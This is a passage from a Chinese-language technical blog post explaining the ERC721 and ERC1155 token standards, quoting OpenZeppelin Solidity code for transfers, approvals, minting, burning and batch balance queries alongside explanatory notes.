class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function tokenURI(uint256 tokenId) public view virtual override returns (string memory) &#123;<br>    _requireMinted(tokenId);<br><br>    string memory baseURI = _baseURI();<br>    return bytes(baseURI).length &gt; 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : &quot;&quot;;<br>&#125;<br><br>/**<br> * @dev Base URI for computing &#123;tokenURI&#125;. If set, the resulting URI for each<br> * token will be the concatenation of the `baseURI` and the `tokenId`. Empty<br> * by default, can be overridden in child contracts.<br> */<br>function _baseURI() internal view virtual returns (string memory) &#123;<br>    return &quot;&quot;;<br>&#125;<br><br>/**<br> * @dev Returns whether `tokenId` exists.<br> *<br> * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.<br> *<br> * Tokens start existing when they are minted (`_mint`),<br> * and stop existing when they are burned (`_burn`).<br> */<br>function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;<br>    return _owners[tokenId] != address(0);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="转账逻辑-1"><a href="#转账逻辑-1" class="headerlink" title="转账逻辑"></a>转账逻辑</h2><p>和ERC20区别在于，没有transfer函数</p><p>且在ERC-20中Token可以无限细分为10^18份，而ERC-721的Token最小的单位为1，无法再分割，而且每一个Token完全不同，不同的Token对不同的用户都有不同的价值。</p><p>除了approve、transferFrom函数以外，ERC721还有safeTransferFrom方法</p><p>safeTransferFrom方法会首先检查合约接收者是否了解 ERC721 协议，以防止代币被永久锁定。</p><p>而transferFrom不会，不鼓励使用此方法，尽可能使用safeTransferFrom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 tokenId<br>) public virtual override &#123;<br>    safeTransferFrom(from, to, tokenId, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(_isApprovedOrOwner(_msgSender(), tokenId), &quot;ERC721: caller is not token owner nor approved&quot;);<br>    _safeTransfer(from, to, tokenId, data);<br>&#125;<br><br>/**<br> * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients<br> * are aware of the ERC721 protocol to prevent tokens from being forever locked.<br> *<br> * `data` is additional data, it has no specified format and it is sent in call to `to`.<br> *<br> * This internal function is equivalent to &#123;safeTransferFrom&#125;, and can be used to e.g.<br> * implement alternative mechanisms to perform token transfer, such as signature-based.<br> *<br> * Requirements:<br> *<br> * - `from` cannot be the zero address.<br> * - `to` cannot be the zero address.<br> * - `tokenId` token must exist and be owned by `from`.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _safeTransfer(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) internal virtual &#123;<br>    _transfer(from, to, tokenId);<br>    require(_checkOnERC721Received(from, to, tokenId, data), &quot;ERC721: transfer to non ERC721Receiver implementer&quot;);<br>&#125;<br><br>/**<br> * @dev Returns whether `tokenId` exists.<br> *<br> * Tokens can be managed by their owner or approved accounts via &#123;approve&#125; or &#123;setApprovalForAll&#125;.<br> *<br> * Tokens start existing when they are minted (`_mint`),<br> * and stop existing when they are burned (`_burn`).<br> */<br>function _exists(uint256 tokenId) internal view virtual returns (bool) &#123;<br>    return _owners[tokenId] != address(0);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>_isApprovedOrOwner用来检查当前函数调用者是否是token的持有者或者是token持有者赋予操控权限的用户地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Returns whether `spender` is allowed to manage `tokenId`.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must exist.<br> */<br>function _isApprovedOrOwner(address spender, uint256 tokenId) internal view virtual returns (bool) &#123;<br>    address owner = ERC721.ownerOf(tokenId);<br>    return (spender == owner || isApprovedForAll(owner, spender) || getApproved(tokenId) == spender);<br>&#125;<br></code></pre></td></tr></table></figure><p>_safeTransfer函数中有一个 _checkOnERC721Received，该函数的实现代码如下所示，其功能用一句话来概括就是要求用于接受token的地址是一个账户地址或者是一个符合ERC-721规范的合约地址，否则回滚交易</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Internal function to invoke &#123;IERC721Receiver-onERC721Received&#125; on a target address.<br> * The call is not executed if the target address is not a contract.<br> *<br> * @param from address representing the previous owner of the given token ID<br> * @param to target address that will receive the tokens<br> * @param tokenId uint256 ID of the token to be transferred<br> * @param data bytes optional data to send along with the call<br> * @return bool whether the call correctly returned the expected magic value<br> */<br>function _checkOnERC721Received(<br>    address from,<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) private returns (bool) &#123;<br>    if (to.isContract()) &#123;<br>        try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) &#123;<br>            return retval == IERC721Receiver.onERC721Received.selector;<br>        &#125; catch (bytes memory reason) &#123;<br>            if (reason.length == 0) &#123;<br>                revert(&quot;ERC721: transfer to non ERC721Receiver implementer&quot;);<br>            &#125; else &#123;<br>                /// @solidity memory-safe-assembly<br>                assembly &#123;<br>                    revert(add(32, reason), mload(reason))<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; else &#123;<br>        return true;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>除了approve，ERC721还有setApprovalForAll方法，能将调用者msg.sender的所有NFT资产授权给_operator地址来管理，或者取消授权，并且触发ApprovalForAll事件。但operator不能是调用者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-setApprovalForAll&#125;.<br> */<br>function setApprovalForAll(address operator, bool approved) public virtual override &#123;<br>    _setApprovalForAll(_msgSender(), operator, approved);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC721-isApprovedForAll&#125;.<br> */<br>function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) &#123;<br>    return _operatorApprovals[owner][operator];<br>&#125;<br><br>/**<br> * @dev Approve `operator` to operate on all of `owner` tokens<br> *<br> * Emits an &#123;ApprovalForAll&#125; event.<br> */<br>function _setApprovalForAll(<br>    address owner,<br>    address operator,<br>    bool approved<br>) internal virtual &#123;<br>    require(owner != operator, &quot;ERC721: approve to caller&quot;);<br>    _operatorApprovals[owner][operator] = approved;<br>    emit ApprovalForAll(owner, operator, approved);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用getApproved函数，根据tokenId来检索授权转账的地址有哪些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC721-getApproved&#125;.<br> */<br>function getApproved(uint256 tokenId) public view virtual override returns (address) &#123;<br>    _requireMinted(tokenId);<br><br>    return _tokenApprovals[tokenId];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="铸币操作-1"><a href="#铸币操作-1" class="headerlink" title="铸币操作"></a>铸币操作</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Safely mints `tokenId` and transfers it to `to`.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must not exist.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC721Receiver-onERC721Received&#125;, which is called upon a safe transfer.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _safeMint(address to, uint256 tokenId) internal virtual &#123;<br>    _safeMint(to, tokenId, &quot;&quot;);<br>&#125;<br><br>/**<br> * @dev Same as &#123;xref-ERC721-_safeMint-address-uint256-&#125;[`_safeMint`], with an additional `data` parameter which is<br> * forwarded in &#123;IERC721Receiver-onERC721Received&#125; to contract recipients.<br> */<br>function _safeMint(<br>    address to,<br>    uint256 tokenId,<br>    bytes memory data<br>) internal virtual &#123;<br>    _mint(to, tokenId);<br>    require(<br>        _checkOnERC721Received(address(0), to, tokenId, data),<br>        &quot;ERC721: transfer to non ERC721Receiver implementer&quot;<br>    );<br>&#125;<br><br>/**<br> * @dev Mints `tokenId` and transfers it to `to`.<br> *<br> * WARNING: Usage of this method is discouraged, use &#123;_safeMint&#125; whenever possible<br> *<br> * Requirements:<br> *<br> * - `tokenId` must not exist.<br> * - `to` cannot be the zero address.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _mint(address to, uint256 tokenId) internal virtual &#123;<br>    require(to != address(0), &quot;ERC721: mint to the zero address&quot;);<br>    require(!_exists(tokenId), &quot;ERC721: token already minted&quot;);<br><br>    _beforeTokenTransfer(address(0), to, tokenId);<br><br>    _balances[to] += 1;<br>    _owners[tokenId] = to;<br><br>    emit Transfer(address(0), to, tokenId);<br><br>    _afterTokenTransfer(address(0), to, tokenId);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="代币销毁-1"><a href="#代币销毁-1" class="headerlink" title="代币销毁"></a>代币销毁</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev Destroys `tokenId`.<br> * The approval is cleared when the token is burned.<br> *<br> * Requirements:<br> *<br> * - `tokenId` must exist.<br> *<br> * Emits a &#123;Transfer&#125; event.<br> */<br>function _burn(uint256 tokenId) internal virtual &#123;<br>    address owner = ERC721.ownerOf(tokenId);<br><br>    _beforeTokenTransfer(owner, address(0), tokenId);<br><br>    // Clear approvals<br>    delete _tokenApprovals[tokenId];<br><br>    _balances[owner] -= 1;<br>    delete _owners[tokenId];<br><br>    emit Transfer(owner, address(0), tokenId);<br><br>    _afterTokenTransfer(owner, address(0), tokenId);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ERC1155"><a href="#ERC1155" class="headerlink" title="ERC1155"></a>ERC1155</h1><p><a href="https://docs.openzeppelin.com/contracts/4.x/erc1155">ERC1155官方文档</a></p><p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts/token/ERC1155">ERC1155合约代码</a></p><p>ERC1155协议是由Witek Radomski, Andrew Cooke等于2018年6月在EIP1155提案中提出的用于多种代币管理的合约标准接口。单个部署的合约可以包括同质化代币、非同质化代币或其他配置（如半同质化代币）的任何组合。</p><p>多代币标准的目的是创建一个智能合约接口，可以代表和控制任何数量的同质化和非同质化代币类型。这样一来，ERC-1155代币就具有与ERC20和ERC721代币相同的功能，甚至可以同时使用这两者的功能。而最重要的是，它能改善这两种标准的功能，使其更有效率，并纠正ERC20和ERC721标准上明显的实施错误。</p><p>由于所有状态都保存在单个合约中，因此可以非常有效地在单个交易中对多个代币进行操作。该标准提供了两个功能，<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#IERC1155-balanceOfBatch-address---uint256---"><code>balanceOfBatch</code></a>和<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#IERC1155-safeBatchTransferFrom-address-address-uint256---uint256---bytes-"><code>safeBatchTransferFrom</code></a>，这使得查询多个余额和转移多个代币变得更简单，消耗gas更少。</p><p>ERC1155的功能包括但不限于以下几点：</p><ul><li>批量传输：通过一次合约调用传输多种资产；</li><li>批量余额：在一次调用中获取多个资产的余额；</li><li>批量授权：授权同一地址的所有代币；</li><li>Hook：接收代币的钩子函数；</li><li>支持非同质化代币：如果供应量仅为 1，将其作为非同质化代币（NFT）处理；</li><li>安全转账规则：安全转账规则集。重要规则如下：<ol><li>调用者必须获得批准才能从 _from 的账户地址消费代币，或者调用者账户地址必须与 _from 的账户地址相同。</li><li>在以下情况下，转账调用将回滚：</li></ol></li></ul><p>​            （1）_to地址为0；</p><p>​            （2）_ ids的长度与_values的长度不同；</p><p>​            （3）_ ids中代币持有者的任何余额低于发送给接收者的相应_value金额；</p><p>​            （4）出现任何其他错误。</p><p><img src="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/image-20220710232011444.png" alt="image-20220710232011444"></p><p><img src="/2022/07/20/ERC20%E3%80%81ERC721%E3%80%81ERC1155%E6%A0%87%E5%87%86%E8%A7%84%E8%8C%83/image-20220710232024558.png" alt="image-20220710232024558"></p><h2 id="基本变量-2"><a href="#基本变量-2" class="headerlink" title="基本变量"></a>基本变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// Mapping from token ID to account balances<br>   mapping(uint256 =&gt; mapping(address =&gt; uint256)) private _balances;<br><br>   // Mapping from account to operator approvals<br>   mapping(address =&gt; mapping(address =&gt; bool)) private _operatorApprovals;<br><br>   // Used as the URI for all token types by relying on ID substitution, e.g. https://token-cdn-domain/&#123;id&#125;.json<br>   string private _uri;<br></code></pre></td></tr></table></figure><h2 id="构造函数-2"><a href="#构造函数-2" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;_setURI&#125;.<br> */<br>constructor(string memory uri_) &#123;<br>    _setURI(uri_);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实现查询-1"><a href="#实现查询-1" class="headerlink" title="实现查询"></a>实现查询</h2><p>与ERC721类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC165-supportsInterface&#125;.<br> */<br>function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) &#123;<br>    return<br>        interfaceId == type(IERC1155).interfaceId ||<br>        interfaceId == type(IERC1155MetadataURI).interfaceId ||<br>        super.supportsInterface(interfaceId);<br>&#125;<br></code></pre></td></tr></table></figure><p>标识是0xd9b67a26</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/*<br>    bytes4(keccak256(&quot;safeTransferFrom(address,address,uint256,uint256,bytes)&quot;)) ^<br>    bytes4(keccak256(&quot;safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)&quot;)) ^<br>    bytes4(keccak256(&quot;balanceOf(address,uint256)&quot;)) ^<br>    bytes4(keccak256(&quot;balanceOfBatch(address[],uint256[])&quot;)) ^<br>    bytes4(keccak256(&quot;setApprovalForAll(address,bool)&quot;)) ^<br>    bytes4(keccak256(&quot;isApprovedForAll(address,address)&quot;));<br>*/<br>bytes4 constant private INTERFACE_SIGNATURE_ERC1155 = 0xd9b67a26;<br></code></pre></td></tr></table></figure><h2 id="基础查询-1"><a href="#基础查询-1" class="headerlink" title="基础查询"></a>基础查询</h2><p>其中balanceOfBatch可以实现批量，在单次调用中获取多个余额。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155MetadataURI-uri&#125;.<br> *<br> * This implementation returns the same URI for *all* token types. It relies<br> * on the token type ID substitution mechanism<br> * https://eips.ethereum.org/EIPS/eip-1155#metadata[defined in the EIP].<br> *<br> * Clients calling this function must replace the `\&#123;id\&#125;` substring with the<br> * actual token type ID.<br> */<br>function uri(uint256) public view virtual override returns (string memory) &#123;<br>    return _uri;<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-balanceOf&#125;.<br> *<br> * Requirements:<br> *<br> * - `account` cannot be the zero address.<br> */<br>function balanceOf(address account, uint256 id) public view virtual override returns (uint256) &#123;<br>    require(account != address(0), &quot;ERC1155: address zero is not a valid owner&quot;);<br>    return _balances[id][account];<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-balanceOfBatch&#125;.<br> *<br> * Requirements:<br> *<br> * - `accounts` and `ids` must have the same length.<br> */<br>function balanceOfBatch(address[] memory accounts, uint256[] memory ids)<br>    public<br>    view<br>    virtual<br>    override<br>    returns (uint256[] memory)<br>&#123;<br>    require(accounts.length == ids.length, &quot;ERC1155: accounts and ids length mismatch&quot;);<br><br>    uint256[] memory batchBalances = new uint256[](accounts.length);<br><br>    for (uint256 i = 0; i &lt; accounts.length; ++i) &#123;<br>        batchBalances[i] = balanceOf(accounts[i], ids[i]);<br>    &#125;<br><br>    return batchBalances;<br>&#125;<br><br>    /**<br>     * @dev See &#123;IERC1155-isApprovedForAll&#125;.<br>     */<br>    function isApprovedForAll(address account, address operator) public view virtual override returns (bool) &#123;<br>        return _operatorApprovals[account][operator];<br>    &#125;<br><br></code></pre></td></tr></table></figure><h2 id="转账逻辑-2"><a href="#转账逻辑-2" class="headerlink" title="转账逻辑"></a>转账逻辑</h2><p>授权</p><p>批准授权与ERC-20略有不同。在ERC1155中无需设置授权金额，只需调用setApprovalForAll将操作员设置为批准或未批准即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155-setApprovalForAll&#125;.<br> */<br>function setApprovalForAll(address operator, bool approved) public virtual override &#123;<br>    _setApprovalForAll(_msgSender(), operator, approved);<br>&#125;<br></code></pre></td></tr></table></figure><p>转账，可以使用safeTransferFrom和可以批量的safeBatchTransferFrom</p><p>safeBatchTransferFrom实现ERC1155代币批量转移，包括同质化代币以及非同质化代币。与ERC20与ERC721相比，ERC1155中唯一的区别是将数值作为数组参数进行传递，此外还会传递数组 id。例如，给出ids=[3, 6, 13]和values=[100, 200, 5]，传输结果如下：</p><ul><li>将id=3的100个代币从地址_ from传输到地址_to；</li><li>将id=6的200个代币从地址_ from传输到地址_to；</li><li>将id=13的5个代币从地址_ from转移到地址_to。</li></ul><p>ERC1155中只有transferFrom，没有transfer。要想像常规的transfer一样使用它，只需将”from”地址设为调用该函数的地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/**<br> * @dev See &#123;IERC1155-safeTransferFrom&#125;.<br> */<br>function safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(<br>        from == _msgSender() || isApprovedForAll(from, _msgSender()),<br>        &quot;ERC1155: caller is not token owner nor approved&quot;<br>    );<br>    _safeTransferFrom(from, to, id, amount, data);<br>&#125;<br><br>/**<br> * @dev See &#123;IERC1155-safeBatchTransferFrom&#125;.<br> */<br>function safeBatchTransferFrom(<br>    address from,<br>    address to,<br>    uint256[] memory ids,<br>    uint256[] memory amounts,<br>    bytes memory data<br>) public virtual override &#123;<br>    require(<br>        from == _msgSender() || isApprovedForAll(from, _msgSender()),<br>        &quot;ERC1155: caller is not token owner nor approved&quot;<br>    );<br>    _safeBatchTransferFrom(from, to, ids, amounts, data);<br>&#125;<br><br>/**<br> * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.<br> *<br> * Emits a &#123;TransferSingle&#125; event.<br> *<br> * Requirements:<br> *<br> * - `to` cannot be the zero address.<br> * - `from` must have a balance of tokens of type `id` of at least `amount`.<br> * - If `to` refers to a smart contract, it must implement &#123;IERC1155Receiver-onERC1155Received&#125; and return the<br> * acceptance magic value.<br> */<br>function _safeTransferFrom(<br>    address from,<br>    address to,<br>    uint256 id,<br>    uint256 amount,<br>    bytes memory data<br>) internal virtual &#123;<br>    require(to != address(0), 